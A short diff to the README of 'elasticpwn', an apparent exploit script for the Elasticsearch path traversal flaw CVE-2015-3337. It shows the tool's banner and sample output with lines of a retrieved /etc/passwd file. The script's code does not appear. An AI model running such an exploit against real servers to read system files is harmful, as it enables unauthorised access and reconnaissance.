@@ -1,6 +1,8 @@
 # elasticpwn
 Script for ElasticSearch url path trasversal vuln. CVE-2015-3337
 
+
+```
 [crg@segfault ~]$ ./elasticpwn.py
 !dSR ElasticPwn - for CVE-2015-3337
 
@@ -46,3 +48,4 @@ nslcd:x:105:109:nslcd name service LDAP connection daemon,,,:/var/run/nslcd/:/bi
 postfix:x:106:111::/var/spool/postfix:/bin/false
 statd:x:107:65534::/var/lib/nfs:/bin/false
 _lldpd:x:108:113::/var/run/lldp
+```
